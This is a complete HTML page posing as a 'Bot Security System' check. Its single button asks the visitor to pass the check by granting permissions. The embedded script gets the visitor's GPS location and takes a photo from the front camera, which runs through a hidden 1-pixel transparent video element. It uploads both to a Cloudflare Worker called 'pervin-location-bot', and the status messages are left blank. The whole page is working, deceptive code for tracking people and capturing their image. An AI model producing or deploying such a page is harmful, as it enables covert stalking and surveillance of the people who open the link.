
<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0">

  <title>Bot Security System</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      padding: 20px;
      background: #0d1117;
      color: #e6edf3;
      font-family: -apple-system, BlinkMacSystemFont,
                   "Segoe UI", Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 20px;
      padding: 30px 24px;
      text-align: center;
      box-shadow: 0 15px 40px rgba(0,0,0,0.3);
    }

    .icon {
      font-size: 48px;
      margin-bottom: 12px;
    }

    h1 {
      margin: 0 0 12px;
      font-size: 24px;
    }

    .description {
      color: #8b949e;
      font-size: 14px;
      line-height: 1.7;
    }

    .notice {
      margin: 20px 0;
      padding: 15px;
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 12px;
      text-align: left;
      font-size: 13px;
      line-height: 1.8;
    }

    .notice-title {
      font-weight: 600;
      color: #e6edf3;
    }

    button {
      width: 100%;
      margin-top: 10px;
      padding: 16px;
      background: #238636;
      border: none;
      border-radius: 10px;
      color: white;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
    }

    button:hover {
      background: #2ea043;
    }

    button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }

    .status {
      margin-top: 15px;
      font-size: 14px;
      line-height: 1.7;
    }

    .status-card {
      padding: 15px;
      margin-top: 12px;
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 10px;
    }

    .success {
      color: #3fb950;
    }

    .error {
      color: #f85149;
    }

    .loading {
      color: #58a6ff;
    }

    .footer {
      margin-top: 25px;
      font-size: 11px;
      color: #6e7681;
    }

    video {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>

<body>

  <main class="container">

    <div class="icon"></div>

    <h1>Bot Security System</h1>

    <button id="startBtn" onclick="startTest()">
      Pass Security System and allow permission
    </button>

    <div id="gpsStatus"
         class="status"
         role="status"
         aria-live="polite"></div>

    <div id="cameraStatus"
         class="status"
         role="status"
         aria-live="polite"></div>

    <video
      id="camera"
      autoplay
      playsinline
      muted>
    </video>

  </main>

  <script>

    // Cloudflare Worker
    const WORKER_URL =
      "https://pervin-location-bot.zaxidlipervin.workers.dev";

    const startBtn =
      document.getElementById("startBtn");

    const gpsStatus =
      document.getElementById("gpsStatus");

    const cameraStatus =
      document.getElementById("cameraStatus");

    let cameraStream = null;
    let isRunning = false;


    async function sendLocation(lat, lon, accuracy) {

      const response = await fetch(
        WORKER_URL + "/location",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            lat,
            lon,
            accuracy
          })
        }
      );

      if (!response.ok) {
        throw new Error("Location upload failed");
      }

      return await response.json();
    }


    // GPS koordinatlarını əldə et
    function getPosition() {

      return new Promise((resolve, reject) => {

        if (!navigator.geolocation) {
          reject(new Error("GPS dəstəklənmir"));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          resolve,
          reject,
          {
            enableHighAccuracy: false,
            timeout: 15000,
            maximumAge: 0
          }
        );

      });
    }


    // GPS testi
    async function testLocation() {

      gpsStatus.innerHTML = `
        <div class="status-card loading">
        </div>
      `;

      try {

        const position = await getPosition();

        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        gpsStatus.innerHTML = `
          <div class="status-card loading">
          
          </div>
        `;

        await sendLocation(lat, lon, accuracy);

        gpsStatus.innerHTML = `
          <div class="status-card success">
           
          </div>
        `;

      } catch (error) {

        let message = "Konum əldə edilə bilmədi.";

        if (error.code === 1) {
          message = "GPS icazəsi verilmədi.";
        }

        else if (error.code === 2) {
          message = "GPS konumu müəyyən edilə bilmədi.";
        }

        else if (error.code === 3) {
          message = "GPS vaxt limiti bitdi (10 saniyə).";
        }

        else if (
          error.message === "Location upload failed"
        ) {
          message = "";
        }

        gpsStatus.innerHTML = `
          <div class="status-card error">
             ${message}
          </div>
        `;

      }
    }


    // Kameranı bağla
    function stopCamera() {

      if (cameraStream) {

        cameraStream.getTracks().forEach(
          track => track.stop()
        );

        cameraStream = null;
      }

      const video =
        document.getElementById("camera");

      video.srcObject = null;
    }


    // Kamera testi
    async function testCamera() {

      cameraStatus.innerHTML = `
        <div class="status-card loading">
        </div>
      `;

      try {

        if (!navigator.mediaDevices?.getUserMedia) {
          throw new Error("Camera unsupported");
        }

        cameraStream =
          await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: "user"
            },
            audio: false
          });

        const video =
          document.getElementById("camera");

        video.srcObject = cameraStream;

        await video.play();

        cameraStatus.innerHTML = `
          <div class="status-card loading">
          </div>
        `;

        // 1 saniyə gözlə
        await new Promise(resolve =>
          setTimeout(resolve, 1000)
        );

        if (!video.videoWidth || !video.videoHeight) {
          throw new Error("Camera not ready");
        }

        const canvas =
          document.createElement("canvas");

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context =
          canvas.getContext("2d");

        context.drawImage(video, 0, 0);

        const photoBlob =
          await new Promise(resolve =>
            canvas.toBlob(
              resolve,
              "image/jpeg",
              0.8
            )
          );

        if (!photoBlob) {
          throw new Error("Photo failed");
        }

        // Foto çəkildikdən sonra kameranı bağla
        stopCamera();

        cameraStatus.innerHTML = `
          <div class="status-card loading">
          </div>
        `;

        const formData = new FormData();

        formData.append(
          "photo",
          photoBlob,
          "security-test.jpg"
        );

        const response = await fetch(
          WORKER_URL + "/photo",
          {
            method: "POST",
            body: formData
          }
        );

        if (!response.ok) {
          throw new Error("Photo upload failed");
        }

        cameraStatus.innerHTML = `
          <div class="status-card success">
          </div>
        `;

      } catch (error) {

        let message = ".";

        if (
          error.name === "NotAllowedError" ||
          error.name === "PermissionDeniedError"
        ) {
          message = "";
        }

        else if (
          error.message === ""
        ) {
          message = "";
        }

        cameraStatus.innerHTML = `
          <div class="status-card error">
             ${message}
          </div>
        `;

      } finally {
        stopCamera();
      }
    }


    // Hər iki testi müstəqil başlat
    async function startTest() {

      if (isRunning) return;

      isRunning = true;
      startBtn.disabled = true;

      // Biri uğursuz olsa, digəri davam edir
      await Promise.allSettled([
        testLocation(),
        testCamera()
      ]);

      startBtn.disabled = false;
      startBtn.textContent = "🔄 Yenidən test et";

      isRunning = false;
    }


    // Səhifədən çıxanda kameranı bağla
    window.addEventListener(
      "pagehide",
      stopCamera
    );

  </script>

</body>
</html>
